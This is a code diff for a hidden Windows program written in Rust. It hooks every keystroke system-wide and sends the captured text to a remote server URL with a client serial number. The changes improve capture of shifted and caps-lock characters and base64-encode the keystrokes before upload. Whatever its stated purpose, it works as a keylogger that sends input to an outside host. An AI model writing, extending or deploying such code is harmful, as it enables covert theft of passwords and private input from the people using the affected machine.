@@ -1,6 +1,7 @@
 #![allow(non_snake_case)]
 #![windows_subsystem = "windows"]
 
+use base64::engine::{general_purpose, Engine};
 use config::Config;
 use log::{error, info};
 use log4rs;
@@ -96,12 +97,18 @@ unsafe extern "system" fn keyboard_proc(n_code: i32, w_param: WPARAM, l_param: L
     if (n_code as u32 == HC_ACTION) && (w_param.0 as u32 == WM_KEYDOWN) {
         let kb_struct = *(l_param.0 as *const KBDLLHOOKSTRUCT);
         let mut buffer = [0u16; 4];
+        let mut key_state = [0u8; 256];
+
+        // 支持 Shift、CapsLock 等组合键，用于特殊字符捕获
+        KeyboardAndMouse::GetKeyState(KeyboardAndMouse::VK_SHIFT.0 as i32);
+        KeyboardAndMouse::GetKeyState(KeyboardAndMouse::VK_CAPITAL.0 as i32);
+        KeyboardAndMouse::GetKeyboardState(&mut key_state).unwrap();
 
         let mut key = '\0';
         if KeyboardAndMouse::ToUnicodeEx(
             kb_struct.vkCode,
             kb_struct.scanCode,
-            &[0u8; 256],
+            &key_state,
             &mut buffer,
             0,
             KeyboardAndMouse::GetKeyboardLayout(0),
@@ -264,11 +271,16 @@ fn main() -> windows::core::Result<()> {
     thread::spawn(move || -> reqwest::Result<()> {
         let mut req;
         let mut res;
+        let mut content_base64;
         let client = Client::new();
         while let Ok(value) = rx.recv() {
+            content_base64 = general_purpose::URL_SAFE_NO_PAD.encode(value.as_bytes());
             req = client
                 .get((*SERVER_URL).as_str())
-                .query(&[("code", value.as_str()), ("sn", (*CLIENT_SN).as_str())])
+                .query(&[
+                    ("code", content_base64.as_str()),
+                    ("sn", (*CLIENT_SN).as_str()),
+                ])
                 .timeout(Duration::from_secs(3))
                 .build()?;
             info!("GET Request: {}", req.url());
